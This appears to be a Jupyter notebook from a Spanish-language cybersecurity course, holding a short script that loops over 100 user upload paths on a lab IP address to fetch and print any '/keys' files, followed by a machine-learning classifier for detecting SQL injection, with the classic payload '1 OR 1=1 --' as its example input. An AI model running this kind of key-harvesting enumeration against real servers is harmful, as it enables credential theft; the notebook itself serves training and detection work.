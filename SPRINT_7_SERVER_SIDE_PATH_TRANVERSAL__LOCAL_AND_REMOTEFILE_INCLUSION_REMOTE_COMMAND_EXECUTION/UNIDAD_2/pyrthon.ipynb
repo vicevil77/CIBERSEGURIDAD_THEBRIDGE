{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "#!/usr/bin/env python3\n",
    "\n",
    "import requests\n",
    "\n",
    "base_url = \"http://10.0.2.15/corp/uploads/env7hdg6-user\"\n",
    "extension = \"/keys\"\n",
    "# probamos los 100 usuarios\n",
    "for i in range(1, 101):\n",
    "    # formateamos el número de usuario a dos dígitos\n",
    "  user = f\"{i:02d}\"\n",
    "  url = f\"{base_url}{user}{extension}\"\n",
    "  print(f\"Probando {url}\")\n",
    "  # hacemos la petición al servidor\n",
    "  response = requests.get(url)\n",
    "  if response.status_code == 200:\n",
    "      print(f\"Archivo encontrado para user{user}\")\n",
    "      print(response.text)\n",
    "  else:\n",
    "      print(\"Archivo no encontrado\")"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "mejora ataques SQLi con IA"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pandas as pd\n",
    "from sklearn.feature_extraction.text import CountVectorizer\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.ensemble import RandomForestClassifier\n",
    "from sklearn.metrics import classification_report\n",
    "\n",
    "# Recolección de datos (simulada)\n",
    "data = pd.read_csv('sql_queries.csv')  \n",
    "\n",
    "# Preprocesamiento de datos con conteo de palabras (bag of words) \n",
    "# para lograr representación numérica de las palabras en las consultas\n",
    "vectorizer = CountVectorizer()\n",
    "X = vectorizer.fit_transform(data['query'])\n",
    "y = data['label']\n",
    "\n",
    "# División de datos en entrenamiento y prueba\n",
    "X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\n",
    "\n",
    "# Entrenamiento del modelo\n",
    "model_SQLi = RandomForestClassifier()\n",
    "model_SQLi.fit(X_train, y_train)\n",
    "\n",
    "# Evaluación del modelo\n",
    "y_pred = model_SQLi.predict(X_test)\n",
    "print(classification_report(y_test, y_pred))\n",
    "\n",
    "# Función para detección de SQL Injection con Machine Learning\n",
    "def detection_SQLi(query):\n",
    "    # Se convierte la consulta a un vector numérico\n",
    "  query_vector = vectorizer.transform([query])\n",
    "  # Se realiza la predicción con el modelo anteriormente entrenado\n",
    "  prediccion = model_SQLi.predict(query_vector)\n",
    "  # Se retorna si la consulta es maliciosa o no,\n",
    "  # suponiendo que las etiquetas son 'malicious' y 'safe'\n",
    "  return prediccion[0] == 'malicious'\n",
    "\n",
    "# Ejemplo de uso\n",
    "query = \"SELECT * FROM users WHERE id = '1 OR 1=1 --'\"\n",
    "if detection_SQLi(query):\n",
    "  print(\"SQL Injection detected!\")\n",
    "else:\n",
    "  print(\"Query is safe.\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "SD-kerascv",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "name": "python",
   "version": "3.8.19"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
